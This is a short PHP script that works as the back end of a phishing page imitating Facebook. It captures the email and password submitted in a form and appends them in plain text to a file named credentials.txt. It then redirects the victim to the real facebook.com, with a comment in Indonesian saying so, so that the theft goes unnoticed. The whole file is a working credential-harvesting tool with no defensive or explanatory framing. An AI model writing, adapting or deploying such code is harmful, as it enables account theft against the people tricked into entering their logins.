<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $data = "Email: " . $email . "\n";
    $data .= "Password: " . $password . "\n";

    $file = fopen("credentials.txt", "a");
    fwrite($file, $data);
    fclose($file);

    header("Location: https://www.facebook.com"); // Alihkan pengguna ke Facebook yang asli
    exit();
}
?>